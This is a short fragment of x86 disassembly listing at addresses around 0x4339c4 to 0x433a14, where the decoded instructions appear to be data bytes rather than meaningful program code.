  4339c4:	add    BYTE PTR [ecx+0x0],cl
  4339c7:	push   ebp
  4339c8:	add    BYTE PTR [eax],al
  4339ca:	add    BYTE PTR [edi+0x0],dl
  4339cd:	push   esp
  4339ce:	add    BYTE PTR [ebx+0x0],cl
  4339d1:	add    BYTE PTR [eax],al
  4339d3:	add    BYTE PTR [edx+0x53],dl
  4339d6:	inc    esp
  4339d7:	push   ebx
  4339d8:	dec    edi
  4339d9:	sub    al,0xda
  4339db:	or     ebx,edi
  4339dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4339de:	mov    DWORD PTR [edx-0x47],0x9f7dd18b
  4339e5:	cli    
  4339e6:	or     al,0x13
  4339e8:	sbb    eax,DWORD PTR [eax]
  4339ea:	add    BYTE PTR [eax],al
  4339ec:	push   esp
  4339ed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  4339f1:	addr16 push edi
  4339f3:	bound  bx,DWORD PTR [edx+0x45]
  4339f7:	outs   dx,BYTE PTR ds:[esi]
  4339f8:	pop    esp
  4339f9:	je     0x433a6e
  4339fb:	ja     0x433a3e
  4339fd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a05:	js     0x433a76
  433a07:	jp     0x433a78
  433a09:	jns    0x433a6f
  433a0b:	jp     0x433a75
  433a0d:	je     0x433a73
  433a0f:	jp     0x433a73
  433a11:	cs jo  0x433a78
  433a14:	bound  eax,QWORD PTR [eax]
	...
